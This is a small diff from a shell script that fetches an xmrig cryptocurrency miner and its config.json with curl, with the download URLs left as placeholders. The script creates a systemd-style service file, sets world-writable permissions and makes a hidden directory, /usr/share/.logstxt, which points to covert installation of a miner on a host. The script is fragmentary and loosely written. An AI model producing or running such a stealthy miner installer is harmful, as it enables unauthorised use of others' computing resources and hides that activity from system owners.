@@ -17,7 +17,7 @@ then
     fi
    }
    exits
-   files=$(curl -s -O < url for xmrig > -O < url for config.json >)
+   files=$(curl -s -O <<<< url of xmrig >>>>  -O <<<< url for config.json >>>>)  #add url of xmrig file and config.json.
    touch xmrig.service
    per=$(chmod 777 xmrig config.json && chmod 644 xmrig.service)
    dir=$(mkdir /usr/share/.logstxt)
